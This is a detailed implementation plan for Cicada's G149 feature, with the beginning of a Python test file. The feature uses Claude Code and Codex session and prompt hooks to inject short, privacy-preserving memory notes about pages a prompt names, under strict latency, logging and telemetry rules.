# Round 4 — Implicit recall through harness hooks (G149) — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Recall stops depending on the chatting model choosing to call a tool, the same move G105 made for
capture. Claude Code's and Codex's own `SessionStart` and `UserPromptSubmit` hooks run one stdlib script
(`api/hooks/recall.py`) that asks a new engine-free endpoint (`POST /capture/hook-context`) what to put in front
of the model: at session start, the connection primer (G75); on every prompt, at most three pages the message
**names**, each with its one-line summary and at most two current claims with their dates, plus at most one open
inbox question about them. The note is at most 400 tokens, or nothing. It is produced within a hard 300 ms, never
logs the prompt, and never blocks or erases one. The primer's contract tells the agent what a "From Cicada" note is.
Settings → Agents gains **Remembers automatically**, with per-harness Turn on / Turn off buttons.

**Architecture:** One pure service (`api/services/hook_recall.py`) reads the derived FTS index (G136) through three
new `search_index.Reader` methods, never the markdown. One route (`POST /capture/hook-context`) runs it off the event
loop under `asyncio.wait_for`. One tiny constants module (`api/services/recall_text.py`) holds the words, so the
composer, the contract and the capture filter agree on them. The hook script mirrors `capture.py`: stdlib only,
run by path, every collaborator injectable. Registration reuses `api/hooks/registry.py`'s marker-owned merge, with
a second marker. `GET /agents/wiring` gains three additive fields, the app runs them through the existing
checkout-pinned allowlist, and nothing that `connect` or onboarding runs changes.

**Tech Stack:** Python 3.12 / FastAPI 0.135 / Pydantic 2.12 (`api/`), SQLite FTS5 (3.47, column filters verified
below), SwiftUI + XCTest (`app/CicadaApp`, Swift tools 5.10, macOS 14), bash (`install.sh`, `scripts/doctor.sh`).

**Sources (binding):**
- The owner's request, 2026-09-24: "i think what you say is worth implementing ourselves for recall and the hooks,
  do it".
- The round-4 brief and contracts: `<scratchpad>/tracks/ROUND4.md`. D7 (portability, privacy, telemetry ids/enums —
  "a model id and an effort enum are enums") applies here. C5 (`/agents/setup`, built from the wiring argv) is
  another track's, and this plan leaves every shape it reads untouched.
- The research this track implements: `<scratchpad>/tracks/r4-bench/hooks-recall-notes.md` and
  `docs/research/2026-09-24-memory-benchmarks-and-implicit-recall.md` §(f), plus the G149 row. The last two reached
  `dev` in PR #101 (`ed6055f`), after this branch's base (`ecb59c7`), so they are not in the worktree. Read them with
  `git show dev:docs/research/2026-09-24-memory-benchmarks-and-implicit-recall.md` and
  `git show dev:docs/goals/memory-evolution.md` (row G149). There is no local `docs/r4-memory-benchmarks` branch,
  only `origin/docs/r4-memory-benchmarks`. The brief overrides the research where they differ, and each override is
  a ruling below (R-H3, R-H4, R-H6, R-H16).
- Backlog rows: **G105** (the capture hook this mirrors), **G76(b)(iv)** (the SessionStart primer this ships),
  **G75/G53** (the handshake), **G136** (FTS, K9 "the query is never logged", R22 access-log stripping),
  **G124 R11 / M2** (the `read` kind and its sibling file), **G113** (why ledger rows are ids only), **G117** (the
  owner page), **G141 capture-side track** (`bank_registry.capture_bank`, the demo rules), and **Track I T3/T7**
  (agent wiring and the app allowlist).
- Standing rulings (TODO.md "Rulings"): no prices and no token counts in the app (2026-09-03), ETag ship-together,
  and ruling 3 (derived indexes never tracked). This plan adds no ETag and no Store domain.

---

## What the code actually does today (verified on `feat/r4-implicit-recall` @ `ecb59c7`)

**Capture is hook-driven; recall is not.**
- `api/hooks/capture.py:55` `TIMEOUT_S = 3.0`. `:89-159` `main()` reads the harness's stdin JSON, POSTs
  `session_id`/`transcript_path` to `POST /capture/transcript`, always exits 0, and prints nothing (a Stop hook's
  stdout is parsed). `:112` `CICADA_CAPTURE=off` exits before any request. `:157-158` logs
  `error: {type}: {exc}`: the message is included. The recall hook must not copy that, because a message can carry
  the input.
- `install.sh:51-55` `HOOK_SCRIPT` + `hook_command()`; `:305-322` section 5b registers only `Stop`, for Claude Code
  and (when `codex` is on PATH) Codex. `:122-127` `--uninstall` runs `registry.py uninstall` (every Cicada
  entry). `:408` summary line. `:70` `--help` prints header lines `3,28`.
- `scripts/doctor.sh:180-190` check 12 = the Stop hook's `registry.py status`.
- **No `SessionStart` or `UserPromptSubmit` hook exists** (`grep -n SessionStart install.sh` → nothing).
  `api/services/handshake.py:155-161` `HOOK_POINTER` is a line asking the model to *call* `cicada_handshake`. `:9`
  says the SessionStart hook is "out of scope here beyond HOOK_POINTER".
  `api/routers/state.py:148` serves it on `GET /handshake` (AGENTS.md pointers keep using it).
- Every recall surface is an MCP tool (`mcp/server.py` tool list; `api/services/mcp_tools.py:514` `recall`,
  `:2245` `check_nudges`).

**The registry owns one script.**
- `api/hooks/registry.py:33` `MARKER = "api/hooks/capture.py"`. `:71-72` `_ours` = the command contains `MARKER`.
  `:85-103` `install` collapses every "ours" entry *in that event* to one. `:123-142` `uninstall` removes every
  "ours" entry in *every* event. `:145-154` `status` → `present|absent|stale`. `:157-180` CLI; exit 3 = unparseable
  file, left untouched.

**Agent wiring is read-only and argv-first.**
- `api/services/agent_wiring.py:46-51` `HARNESSES` (claude-code `.claude/settings.json`, codex `.codex/hooks.json`).
  `:63-65` `hook_command`. `:72-78` `_autosave`. `:81-107` `_harness` builds `connect` (the `mcp` and `hook` steps).
  `:127-135` `probe`.
- `api/models/schemas.py:2269-2303`: `AgentWiringStep.step: Literal["mcp", "hook"]`, and
  `AgentWiringRow.autosave: Literal["on","off","stale","invalid","n/a"]`.
- App: `Support/AgentConnect.swift:80-106` `AgentConnectPolicy.isAllowed` allows exactly two shapes, `mcp add` and
  `registry.py install … --event Stop --command <capture cmd>`. `Models/AgentWiring.swift:29-57` decodes leniently.
  `Support/FoundTurnOn.swift:82` runs `agent.connect` (onboarding) and nothing else.
- Settings → Agents is `Views/Connect/ConnectView.swift:203-307`. It is a copy-paste catalog today and never reads
  `/agents/wiring`.

**Search cannot take a prompt as it is.**
- `api/services/text_fold.py` `query_tokens` caps a query at `MAX_TOKENS = 8`. `api/services/search_index.py:137-143`
  `match_expression` is **every token a quoted prefix term, implicit AND**. A twenty-word prompt through
  `search_service.search(…, mode="prefix")` would therefore require its first eight words to all match, and it
  finds nothing. The hook needs its own candidate read.
- `search_index.py:92-107`: `ent(title, aliases, keywords, body)`, `clm(title=claim text, aliases, keywords,
  payload UNINDEXED)`, rowid `doc_id << 16 | n`. `:326-422` `_index_entity` stores `meta = {name, type, status,
  confidence, summary, aliases[:8], tags}` and claims with a payload of `{id, predicate, object, confidence,
  valid_from, valid_to, superseded_by, observer, evidence, status}`. `:452-488` `_index_inbox` stores
  `meta = {question (the served decay question included), kind, entity_id, entity_name, status, priority,
  remind_after}`. `:601-659` `ensure_fresh(max_age_s=)` returns `ready|stale|building|unavailable`. `:781-915`
  `Reader`.
- FTS5 column filter over an OR group works in the venv's SQLite, measured here:
  `{title aliases} : ("alpha" OR "bob")` matches titles and aliases and never the body (SQLite 3.47.1).
- `api/services/providers.py:47` `_EMBED_CACHE` holds loaded embedders. `:66-103` `cached_embed_fn_for_model`
  **builds on a miss** (a multi-second model load). `:691/:696` `_model_is_openai` / `_model_is_openrouter` are the
  hosted embedders. `:703-734` `resolve_embed_fn_for_model` → cache. `vector_index.py:215-230` `index_info()["model"]`
  is the model the bank's vectors were built with. `:348-379` `search_kinds` embeds once and runs KNN.
- `api/services/mcp_tools.py:2268-2296` `check_nudges`' item filter: skipped ids, `kind == normalization`, exact
  `entity_id ∈ entity_ids`, then the topic, then `inbox_questions.is_deferred`.

**Privacy plumbing.**
- `api/main.py:53-58` adds the loguru sink with default `backtrace`/`diagnose`, so a `logger.exception` prints
  frame locals. `:77` `_QUERY_PATHS = {"/search", "/conversations/recent"}` strips query strings from uvicorn's
  access line. No `RequestValidationError` handler exists, so FastAPI's 422 **echoes the input in the response
  body**. That body is not logged.
- `api/services/telemetry.py:22-26` `KINDS`, `:43` `NON_SPEND_KINDS`, `:147-152` `SIBLING_KINDS = {read,
  remote_call}` → `reads-YYYY-MM.jsonl`, which no sync component stats (G124 M2). A row in `events-*.jsonl` ticks the
  app's consumption domain. `handshake.record` (`handshake.py:541-569`) writes a `handshake` row to the **events**
  file. `read_events` (`:231-265`) reads BOTH prefixes, so a sibling row still reaches every `/consumption/*` view.
- `api/services/consumption_stats.py:250-258` `_activity` drops `capture` rows from every Usage view (hour
  histogram, daily series, `by_stage`, `by_bank`, calendar): a Stop hook fires on every reply, and counting its
  receipts charted the person's chat cadence instead of Cicada's work (G105 final review F1,
  `test_consumption_stats.py::test_capture_rows_are_not_activity`). A per-prompt recall row is the same class.
- `api/services/transcript_extract.py:53-60` `CLAUDE_HARNESS_TAGS`, `:67` `_SYSTEM_REMINDER_RE`. `:278-307` the
  Claude Code user block is filtered: `isMeta` is dropped, `<system-reminder>…</system-reminder>` is stripped
  anywhere in a block (`:297`), and a block OPENING with a harness tag is dropped (`:298-301`, `_first_tag` reads the
  leading tag only). Non-`user`/`assistant` lines (attachments) are skipped at `:262-265`. `:371-381` Codex: a
  `user` block opening with a Codex harness tag is dropped (`:373`), and `role == "developer"` messages are dropped
  (`count_msg("developer")`, `:380-381`).

**The demo guard.**
- `api/routers/capture.py:32-43` `refuse_capture_into_demo`. `:188` the Stop route resolves
  `bank_registry.capture_bank(settings.memory_root)` (`bank_registry.py:503-516`): the active bank, or the real bank
  left most recently while a demo is open, or `None`. `api/tests/test_demo_capture_routes.py:44` `HANDLED_ELSEWHERE`
  must name every POST/PUT under `/capture/` that the dependency does not gate.

**Verified outside the repo (2026-09-24).**
- **Claude Code hooks reference** (`https://code.claude.com/docs/en/hooks.md`, downloaded raw and read directly;
  a summarising fetch misreported one field name, so the raw text is what counts):
  - `SessionStart` input: `session_id, transcript_path, cwd, hook_event_name, source (startup|resume|clear|compact|
    fork), model?`. `UserPromptSubmit` input: the common fields plus **`prompt`**.
  - Both accept `{"hookSpecificOutput": {"hookEventName": …, "additionalContext": "…"}}`. Plain stdout also becomes
    context, and "your hook's stdout must contain only the JSON object".
  - UPS default timeout is 30 s. A UPS hook that times out has its output discarded, and the prompt still goes
    through. **Exit 2 blocks the prompt and erases it.**
  - Every `additionalContext` string is **capped at 10,000 characters**. Longer text is saved to a file, and only a
    2,000-character preview reaches Claude.
  - All matching hooks run in parallel.
  - "Write the text as factual statements rather than imperative system instructions … can trigger Claude's
    prompt-injection defenses."
  - The injected text is saved in the session transcript, and SessionStart runs again on resume.
- **Codex** (`openai/codex` @ `c098f97e5305394c7f30a876c1393cf34a3eedca`):
  - Input shapes (`codex-rs/hooks/src/events/user_prompt_submit.rs`, `schema.rs`):
    - `UserPromptSubmitCommandInput` = `session_id, turn_id, agent_id?, agent_type?, transcript_path, cwd,
      hook_event_name: "UserPromptSubmit", model, permission_mode, prompt`.
    - `SessionStartCommandInput` = `session_id, transcript_path, cwd, hook_event_name: "SessionStart", model,
      permission_mode, source`.
  - Hook context enters the conversation as a **`developer`-role** message
    (`core/src/context/hook_additional_context.rs`: `role() → "developer"`).
  - `DEFAULT_HOOK_OUTPUT_TOKEN_LIMIT = 2_500` (`hooks/src/output_spill.rs`).
  - `hooks.json` has Claude's shape with `timeout` in seconds (`config/src/hook_config.rs`).
  - Hooks are on by default (`Feature::CodexHooks`, `Stage::Stable`, `default_enabled: true`). A user hook runs
    **only once trusted**: `discovery.rs` `hook_trust_status` → `Trusted|Managed`, and a new or changed hash is
    `Untrusted|Modified`. At startup Codex offers "Review hooks / Trust all and continue / Continue without trusting
    (hooks won't run)" (`tui/src/startup_hooks_review.rs`), and `/hooks` manages them.
- **Observed in a live Claude Code session (the session that wrote this plan):** the `cicada` MCP server's
  `instructions` reached the system context cut off mid contract item 4 with `… [truncated]`. Claude Code truncates
  MCP instructions, so the now-view after the contract never reaches a Claude Code model today.

**Baselines on this base:** backend `3775 passed, 1 skipped`; Swift `2003 tests, 0 failures`; graph JS 8/8.

---

## Global Constraints

- Work ONLY in `<worktree>` = `<repo>/.worktrees/r4-recall` (branch `feat/r4-implicit-recall`, based on `dev` @
  `ecb59c7`; the orchestrator's task message carries the absolute path, which this committed plan never spells). Every shell command is
  `cd <worktree> && <cmd>` with the ABSOLUTE path (zoxide hijacks relative `cd`; ignore its stderr warning). No
  `grep --include=*.ext` (zsh globs it). Use `rg` or quote it.
- NEVER read `<repo>/memory` (any bank), `~/.cicada`, `~/Library/Safari` or `~/.claude/projects`. Fixtures are
  synthetic: `alpha-project`, `bob-example`, `example.com`, `Example Corp`, `Pat Owner`.
- Python: `cd <worktree> && api/.venv/bin/python -m pytest <files> -q -p no:cacheprovider`; full suite `api/tests`
  → **0 failures**. `test_agent_provenance.py::test_a_decay_only_change_lands_in_its_own_cicada_authored_commit` is
  order-dependent. If it is the ONLY red, re-run it alone and report both results.
- Swift: `cd <worktree>/app/CicadaApp && swift build 2>&1 | tail -5` succeeds, and `swift test 2>&1 | tail -20`
  reports **0 failures**. SleepViewModelTests poll tests and the search latency tests can flake under load, so re-run
  them alone before calling them yours. Graph JS:
  `cd <worktree> && node --test app/CicadaApp/Tests/graph/*.test.js` (8/8). SourceKit diagnostics naming OTHER
  worktrees are noise.
- NEVER run `make dev`, `make install-app`, `swift run`, `./install.sh` in any mode (even `--dry-run` probes the
  live machine), `make doctor`, or launch/kill the Cicada app or the launchd backend. The owner's install is live.
  The orchestrator installs and live-checks. `bash -n` syntax checks are fine.
- Never `git add -A`; stage named files only. Never commit `memory/`, `logs/`, `.claude/settings.json`,
  `api/.venv`, or `*-report.md`. No push, no new branches or worktrees, no subagents. Ignore Devin/PR comments.
  End every commit with the session's attribution lines.
- **The prompt is never logged, stored or sent to telemetry**:
  - no `logger.exception` on this path;
  - no exception *message* in any log line, only the class;
  - no prompt text in a query string;
  - no prompt in `recall.log`.
  Task 2's privacy test is the gate.
- **Engine-free, read-only.** Nothing on the hook path calls an LLM, loads a model, fetches a URL or writes a bank.
  Two derived writes are allowed because every read path already makes them: `search_index.ensure_fresh` may
  refresh or start building the untracked `search_index.db` (TODO ruling 3), and `handshake.load_or_build` writes
  its primer cache under `$CICADA_HOME/handshake/`, never in a bank. `bank_registry.capture_bank` and
  `load_registry` are pure reads (`bank_registry.py:273-297`, `:503-516`).
- **Additive wiring.** `connect` and the `mcp`/`hook` steps stay byte-identical, and so does `PROBE_TIMEOUT_S`. C5
  and the probe-timeout change belong to another track. Do not edit those parts.
- **Portability:** no owner name, no author-machine path in shipped code, plans, commits or PR bodies (write
  `<repo>` / `<worktree>`). `test_owner_name_portability.py` walks every shipped `api/` and `mcp/` file, new ones
  included, for the owner's name. `test_agent_wiring.py::test_no_author_machine_path_is_baked_in` reads
  `agent_wiring.py` ONLY, so before each commit run
  `cd <worktree> && rg -n "/Users/|/home/" api/hooks/recall.py api/services/hook_recall.py api/services/recall_text.py`
  and expect nothing. (Test fixtures may use `/home/example/…` and `/Users/x/…`, as the existing suites do.)
- **App:**
  - Fonts go through `CicadaTheme.font` and sizes through `CicadaTheme.scaled`.
  - Monospace only inside `CommandBox`, which is on `MonospaceLintTests`' allowlist.
  - Real marks via `LogoImage.platformTile`.
  - No prices and no token counts.
  - Every new wire field decodes when absent.
  - The commit cites the DR ids it applies.
- Docstrings explain **why**, citing the G-row or ruling. Match the density of the files touched. Line numbers
  above are from `ecb59c7` and drift as tasks land, so read the cited code before editing.

---

## Rulings (binding)

Where the brief left a choice, the choice is made here with its reason, so no task re-opens it.

- **R-H1 — One route, `POST /capture/hook-context`, JSON body, bearer-authed, never demo-gated.**
  - It sits under `/capture/` because that is where the harness hooks already post, and it shares
    `/capture/transcript`'s auth.
  - It writes nothing, so `refuse_capture_into_demo` does not apply. `test_demo_capture_routes.HANDLED_ELSEWHERE`
    names it with that reason.
  - The prompt rides only in the body. Nothing joins `_QUERY_PATHS`, because there is no query string to strip, and
    a test pins the route to zero query parameters.
- **R-H2 — The relevance floor is a *named mention*.** It was tuned on Task 1's fixture table, with 8 positives and
  10 negatives, and it holds on the 2,000-page bank's 12 English prompts.
  - A page is injected only when the prompt window contains its **whole** name, or one whole alias, as a contiguous
    run of words, folded the way the index folds them (Zürich = zurich).
  - A multi-word name needs at least one real word (≥ 3 characters, not a stopword, not a number).
  - A **one-word** name or alias counts only for `person | project | company | tool | location`, and never a
    stopword. A concept or skill called "Memory" is not named by "a memory leak", and half of "Temporal Decay" is
    not the name.
  - Only `active`/`decaying` pages qualify, never `media`, `directory` or legacy `deadline`, and never the owner's
    own page (the primer carries it, and "I" would otherwise name it in every message).
  - A page with neither a summary nor a current claim is skipped: there is nothing to recall.
  - Why: a prompt is prose, and body or claim-text matches are exactly how noise enters. The research's rule applies:
    a miss must cost zero tokens.
- **R-H3 — Candidates come from an OR over `title`/`aliases` only, whole terms, no prefix.**
  - `query_tokens` + `match_expression` are the palette's rule: implicit AND over eight prefix tokens, which fits a
    typeahead and not a paragraph.
  - Terms are the prompt window's words minus stopwords and words under 3 characters. They are taken **from the end
    backwards**, capped at 48, because a question typed after a pasted log closes the message.
  - `Reader.name_candidates` owns the SQL.
- **R-H4 — "Escalate to hybrid" means re-order, never add, and only on-device.**
  - When more than 3 named pages survive and at least 150 ms remain, one query embedding orders pages the message
    named equally loudly: first by name length said, then by vector rank.
  - It runs only if the bank's recorded embedder is **already loaded** in this process
    (`providers.warm_local_embed_fn`) and is **not hosted**.
  - An automatic per-prompt hook must never pay a model load, and must never send the person's words to OpenAI or
    OpenRouter. The palette's opt-in hybrid search has that data flow; this hook does not get it.
  - Why "never add": no cosine floor can be tuned offline, and adding semantic-only pages is exactly what G148's H
    mode must measure first.
- **R-H5 — The note: ≤ 400 tokens by the chars/4 proxy (the handshake's R10).**
  - At most 3 pages, each ≤ 2 current claims, newest first, with `(since YYYY-MM-DD)`.
  - At most one inbox line, chosen by `check_nudges`' own filter (`mcp_tools.nudge_visible`, extracted in Task 1).
    The line is a pointer to `cicada_check_nudges(entity_ids=[…])`, never the card.
  - Cuts are made in a fixed order: second claims (last page first), the inbox line, pages after the first,
    summaries to 60 characters, claims.
  - The prompt window is all of it up to 8,000 characters, else the first 6,000 plus the last 2,000.
- **R-H6 — Time.**
  - The route holds a hard `asyncio.wait_for`: 300 ms for a prompt, 800 ms for the primer. Past it, `timeout` and no
    note.
  - The script's one request has a 0.9 s timeout. It exits 0 always and never 2, and prints nothing but the one
    JSON object.
  - Registered with the registry's default `timeout: 5`, a backstop the script never reaches.
  - Why not the G149 row's "~300 ms client timeout": the client's clock also covers connecting to loopback, the
    JSON round trip and, for SessionStart, an 800 ms primer budget. A 300 ms client timeout would throw away answers
    the backend produced in time. So 300 ms is the backend's promise, and 0.9 s is the ceiling on what one prompt
    can ever wait when the backend hangs.
- **R-H7 — The session window.**
  - A page shown in either of the session's last **2** prompt firings steps aside.
  - The window is process-local, bounded to 512 sessions, and **reset by SessionStart** (compact and clear lose the
    earlier notes).
  - It is updated only after the route actually answered within budget, so a timed-out turn never hides a page.
- **R-H8 — SessionStart sends the full primer under a "From Cicada" header, even where MCP instructions exist.**
  - Claude Code truncates MCP instructions (observed above), so the now-view never reaches the model otherwise.
  - The primer's ≤ 1,800-token budget (≈ 7,200 characters) sits inside both caps: Claude Code's 10,000 characters
    and Codex's 2,500 tokens. A test pins ≤ 9,500 characters.
  - It is sent on every `source`, because Claude Code's own guidance is that SessionStart refreshes context on
    resume.
  - `handshake.record` is **not** called: it writes to the events file and would tick the consumption domain.
- **R-H9 — Telemetry: a new non-spend kind, `hook_recall`, filed beside `read`.**
  - One row per firing: `{harness, event, reason, injected (count), entity_ids, inbox (bool), tokens (bucket),
    latency (bucket), model (id or None)}`. Never the prompt.
  - No per-page `read` rows: a page Cicada attached automatically is not a page anyone chose to open, and
    `/contributors/top-entities` must stay honest.
  - It is a per-prompt receipt, so `consumption_stats._activity` drops it beside `capture` (G105 final review F1):
    `read_events` reads the sibling file too, and without the exclusion every Usage view would chart the person's
    typing (a `hook_recall` stage row, per-bank counts, the hour histogram, the daily series, the calendar).
- **R-H10 — Never logged.**
  - The route logs `type(exc).__name__` only.
  - `recall.log` holds only enums, counts and milliseconds. It never includes a page id or a response body, and a 4xx
    body is never read (FastAPI's 422 echoes the input).
- **R-H11 — Registration.**
  - **One command for both events.** Stdin's `hook_event_name` names the event, a field verified in both harnesses.
  - The registry gains a second marker, `api/hooks/recall.py`, and `uninstall --hook recall`, so turning recall off
    never touches the Stop hook.
  - `install.sh` registers the recall hooks by default, and `CICADA_RECALL=off` skips them.
  - The app offers **Turn on / Turn off** from the new `autorecallOn`/`autorecallOff` lists.
  - **`connect` is untouched**, so onboarding's Turn on and C5's paste prompt run what they ran. Whether they should
    also turn recall on is the one open question.
- **R-H12 — Capture never re-captures recall.** There are four layers:
  - Codex files hook context as a `developer` message, which is already dropped (source-verified).
  - Claude Code wraps it in a system reminder or an attachment line, both of which are already dropped.
  - `transcript_extract` now also drops a user block that opens with `recall_text.INJECTION_PREFIX`.
  - It also strips a `<user-prompt-submit-hook>…</user-prompt-submit-hook>` or `<session-start-hook>…</…>` span
    wherever it sits in a block (the `_SYSTEM_REMINDER_RE` rule), and drops a block that opens with either tag
    unclosed. Those tag names are unverified here, because no transcript is read. A person never types them, so the
    check costs nothing. A span strip, not only a leading-tag check, because `_first_tag` reads the first tag of a
    block and a harness that appended hook output after the prompt would otherwise slip through.
  - A recalled note captured as "the person said" would hand Sleep its own memory as new evidence.
- **R-H13 — The contract item is factual and remote-free.**
  - Item 8 tells an agent what a "From Cicada" note is, in statements, per Claude Code's prompt-injection guidance,
    and names only `cicada_recall_detail(entity_id)`, which R12 holds.
  - `CONTRACT_VERSION` 6 → 7. If another round-4 track also takes 7, the merge takes 8: bump past, never reuse,
    following the G138/G140 precedent.
  - The **remote** contract does not change, because a cloud app has no hook.
- **R-H14 — Codex trust is the person's.** Cicada never edits Codex's trust state. The app row and `install.sh` say
  that Codex asks at its next start and that an untrusted hook never runs.
- **R-H15 — A Codex sub-agent's prompt is skipped** (`agent_id` present). It is the parent agent talking, not the
  person.
- **R-H16 — The bank is `bank_registry.capture_bank`.** That is the real bank left most recently while a demo is
  open, and `no_bank` means nothing is injected. This overrides the research's "skip under an active demo": made-up
  memory never reaches a real session either way.
- **R-H17 — `cwd` is accepted and unused.** It is reserved for a later cwd → project rule and never logged.
- **R-H18 — The app group is its own file plus one line in `ConnectView`.** Another round-4 track owns that page's
  rewrite. Rows appear only for installed harnesses whose `autorecall` is not `n/a`, so an older backend shows no
  row, never a broken one.

---

## File map

| File | Task | Responsibility |
|---|---|---|
| `api/services/recall_text.py` (new) | 1 | The note's headers, footer, `question_line`, `is_injection` |
| `api/services/hook_recall.py` (new) | 1, 2 | Floor, candidates, claims, inbox pointer, `compose`/`fit`, `session_primer`, `RecentPages`, `respond`, `record` |
| `api/services/search_index.py` | 1 | `Reader.name_candidates`, `Reader.claims_of`, `Reader.inbox_docs` |
| `api/services/providers.py` | 1 | `warm_local_embed_fn` (never builds, never hosted) |
| `api/services/mcp_tools.py` | 1 | `nudge_visible` extracted from `check_nudges` (behaviour unchanged) |
| `api/routers/capture.py` | 2 | `HookContextRequest`, `POST /capture/hook-context` |
| `api/services/telemetry.py` | 2 | `hook_recall` kind: KINDS, NON_SPEND, SIBLING |
| `api/services/consumption_stats.py` | 2 | `PER_TURN_KINDS`: `_activity` drops `hook_recall` beside `capture` (R-H9) |
| `api/services/handshake.py` | 2 | Contract item 8, `CONTRACT_VERSION = 7`, docstring + `HOOK_POINTER` comment |
| `api/hooks/recall.py` (new) | 3 | The stdlib hook script |
| `api/hooks/registry.py` | 3 | Two markers, marker-aware install/status, `uninstall --hook` |
| `api/services/agent_wiring.py` | 3 | `recall_hook_command`, `autorecall_argv`, `autorecall_fields`, probe merge |
| `api/models/schemas.py` | 3 | `AgentWiringStep.step` + `AgentWiringRow.autorecall*` |
| `api/services/transcript_extract.py` | 3 | R-H12's drop rules |
| `install.sh`, `scripts/doctor.sh` | 3 | Section 5c, uninstall text, summary, help range; doctor check 13 |
| `api/tests/fixtures/agent_autorecall_argv.json` (new) | 3 | The argv the backend serves = the argv the app allows |
| `app/…/Models/AgentWiring.swift` | 4 | `autorecall`, `autorecallOn`, `autorecallOff` (lenient) |
| `app/…/Support/AgentConnect.swift` | 4 | Allowlist: recall install events + `uninstall --hook recall` |
| `app/…/Support/AutoRecall.swift` (new) | 4 | `AutoRecallState`, `AutoRecallAction`, `AutoRecall`, `AutoRecallModel` |
| `app/…/Views/Connect/AutoRecallGroup.swift` (new) | 4 | The Settings group and its rows |
| `app/…/Views/Connect/ConnectView.swift` | 4 | One line: `AutoRecallGroup()` |
| `app/…/Views/Settings/SettingsRowID.swift`, `SettingsIndex.swift` | 4 | `.agentsAutoRecall`, `.autoRecall(id)`, its search entry |
| `app/…/Theme/Copy+Settings.swift` | 4 | The group's words |
| Tests (Python) | 1–3 | `test_hook_recall.py`, `test_hook_context_route.py`, `test_hook_recall_privacy.py`, `test_hook_recall_latency.py`, `test_recall_hook.py` (new); edits to `test_handshake.py`, `test_handshake_r12.py`, `test_demo_capture_routes.py`, `test_consumption_stats.py`, `test_hooks_registry.py`, `test_agent_wiring.py`, `test_transcript_extract.py` |
| Tests (Swift) | 4 | `AutoRecallTests.swift` (new) |
| Docs | 5 | `CLAUDE.md`, `docs/goals/memory-evolution.md` (G76 only), `docs/goals/TODO.md` |

---

### Task 1: The recall engine (no route yet)

Everything the hook *decides* is a tested pure function over the derived index. Nothing is wired, so the branch stays
shippable.

**Files:**
- Create: `api/services/recall_text.py`, `api/services/hook_recall.py`
- Modify: `api/services/search_index.py` (three `Reader` methods after `docs`, `:875`),
  `api/services/providers.py` (one function after `clear_embed_cache`, `:61-64`), `api/services/mcp_tools.py`
  (`check_nudges` loop `:2268-2296` + a new `nudge_visible` above `check_nudges`)
- Test: `api/tests/test_hook_recall.py` (new)

**Interfaces:**
- Produces:
  - `recall_text.{INJECTION_PREFIX, RECALL_HEADER, PRIMER_HEADER, RECALL_FOOTER, is_injection, question_line}`
  - `hook_recall.{Injection, PageNote, prompt_window, prompt_terms, mention_strength, current_claims, compose, fit,
    prompt_context, session_primer, RecentPages, RECENT, reset}` plus its constants
  - `Reader.name_candidates(terms, limit) -> [(doc_id, bm25)]`, `Reader.claims_of(doc_id) -> [(text, payload)]`,
    `Reader.inbox_docs() -> [Doc]`
  - `providers.warm_local_embed_fn(model_id) -> EmbedFn | None`
  - `mcp_tools.nudge_visible(fm, *, wanted, today, skipped=frozenset(), stem="") -> bool`
- Consumes: `search_index.ensure_fresh/Reader/Doc`, `text_fold.words`, `state_dictionary.read_state`,
  `handshake.load_or_build/VARIANTS`, `inbox_questions.is_deferred`,
  `vector_index.SqliteVecIndexer.index_info/search_kinds`.

- [ ] **Step 1: Failing tests.** Create `api/tests/test_hook_recall.py`:

```python
"""G149 — the recall hook's engine: which pages a prompt NAMES (R-H2), what a
note says about them (R-H5), the session window (R-H7) and the on-device-only
re-rank (R-H4). Synthetic bank only (alpha-project, bob-example, example.com);
no real bank, no ~/.cicada, no model, no network."""
from __future__ import annotations

import numpy as np
import pytest

from api.services import (
    bank_index, hook_recall, markdown_parser, mcp_tools, providers, recall_text, search_index,
)


def _claim(cid: str, text: str, *, subject: str, since: str | None = None, until: str | None = None) -> str:
    row = f"- id: {cid}\n  text: \"{text}\"\n  subject: {subject}\n  predicate: note\n  object: x\n"
    if since:
        row += f"  valid_from: '{since}'\n"
    if until:
        row += f"  valid_to: '{until}'\n"
    return row


def _page(memory, eid, name, etype, *, aliases=(), summary="", claims=(), status="active", confidence=0.7,
          extra_body=""):
    body = (f"## Summary\n{summary}\n\n" if summary else "") + extra_body
    if claims:
        body += "```claims\n" + "".join(claims) + "```\n"
    markdown_parser.write(memory / "entities" / f"{eid}.md",
                          {"name": name, "type": etype, "status": status, "confidence": confidence,
                           "aliases": list(aliases), "tags": []}, body)


def _index(memory):
    bank_index.invalidate()
    search_index.reset()
    search_index.rebuild(memory)


@pytest.fixture(autouse=True)
def _clean():
    hook_recall.reset()
    yield
    hook_recall.reset()
    search_index.reset()
    bank_index.invalidate()


@pytest.fixture
def bank(tmp_path):
    memory = tmp_path / "memory"
    for sub in ("entities", "episodes", "inbox"):
        (memory / sub).mkdir(parents=True)
    _page(memory, "alpha-project", "Alpha Project", "project", aliases=["Alpha"], confidence=0.9,
          summary="Rebuilding the onboarding flow for the beta.",
          claims=[_claim("c1", "The beta ships on October 1.", subject="alpha-project", since="2026-09-01"),
                  _claim("c2", "Bob Example reviews the designs.", subject="alpha-project", since="2026-08-20"),
                  _claim("c3", "The beta ships in September.", subject="alpha-project", since="2026-07-01",
                         until="2026-09-01"),
                  _claim("c4", "The team uses a shared board.", subject="alpha-project", since="2026-06-01")])
    _page(memory, "bob-example", "Bob Example", "person", aliases=["Bob"], summary="Designer on the alpha project.",
          claims=[_claim("c5", "Works at Example Corp.", subject="bob-example", since="2026-05-01")])
    _page(memory, "example-corp", "Example Corp", "company", summary="A design studio.")
    _page(memory, "memory-concept", "Memory", "concept", summary="How recall works.")
    _page(memory, "temporal-decay", "Temporal Decay", "concept", summary="Silence is a signal.")
    _page(memory, "python-tool", "Python", "tool", summary="Prefers uv over pip.")
    _page(memory, "zurich", "Zürich", "location", summary="Where the studio is.")
    _page(memory, "old-project", "Old Project", "project", status="archived", summary="Wound down.")
    _page(memory, "pat-owner", "Pat Owner", "person", aliases=["Pat"], summary="The person this memory is for.")
    _page(memory, "gamma-thing", "Gamma Thing", "concept")                      # nothing to say
    _page(memory, "cicada-api", "Cicada Api", "directory", summary="A checkout.")
    _page(memory, "delta-zero", "Delta Zero", "concept", summary="Mentions alpha in its body only.")
    markdown_parser.write(memory / "_state.md", {"type": "state", "owner_id": "pat-owner"}, "")
    markdown_parser.write(memory / "inbox" / "inbox-001.md",
                          {"kind": "conflict", "status": "pending", "entity_id": "alpha-project",
